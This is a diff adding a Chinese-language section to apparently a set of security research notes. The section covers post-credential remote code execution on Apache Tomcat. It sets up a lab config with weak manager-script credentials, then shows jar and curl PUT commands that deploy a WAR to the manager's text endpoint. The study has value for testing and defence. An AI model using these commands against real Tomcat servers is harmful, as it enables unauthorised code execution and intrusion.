@@ -45,6 +45,54 @@
 
 利用研究
 ---
+
+### Text Interface + WAR -> Post-RCE
+
+
+**前言**
+
+> Tomcat的一种鸡肋利用，需要获取`manager-script roles`角色用户的凭证。
+
+  翻tomcat文档考古 -> `Deploy A New Application Archive (WAR) Remotely`
+
+- https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Deploy_a_Directory_or_WAR_by_URL
+
+![image](https://user-images.githubusercontent.com/55024146/177111478-ef51df0a-0a65-412b-8f75-85fbfce82d55.png)
+
+重点：This command is executed by an HTTP `PUT` request.  也许可能大概可以用来绕安全设备??? 
+
+
+**复现步骤**
+
+0）测试环境
+- apache-tomcat-8.5.55
+- conf/tomcat-user.xml
+  ```xml
+  <?xml version='1.0' encoding='utf-8'?>
+  <tomcat-users>
+    <role rolename="manager-script"/>
+    <user username="tomcat" password="tomcat" roles="manager-script"/>
+  </tomcat-users>
+  ```
+
+1）制作WAR包
+```
+jar -cvf demo.war *
+```
+
+2）上传并部署WAR包
+```
+curl -u "tomcat:tomcat" -X PUT -T "demo.war" "http://10.10.10.1:8080/manager/text/deploy?path=/demo" --proxy "127.0.0.1:9090"
+```
+
+3）测试效果
+
+![image](https://user-images.githubusercontent.com/55024146/177114675-61d9ecb3-c279-4b77-9d1d-26c083272c19.png)
+
+
+PS: 测完发现@indishell1046在18年就在提出了这种[姿势](https://twitter.com/indishell1046/status/978704150014844928)，security "re-searcher"再一次在自己这儿实锤🤦‍♂️. 
+
+
 ### URL解析差异
 
 ### 回显
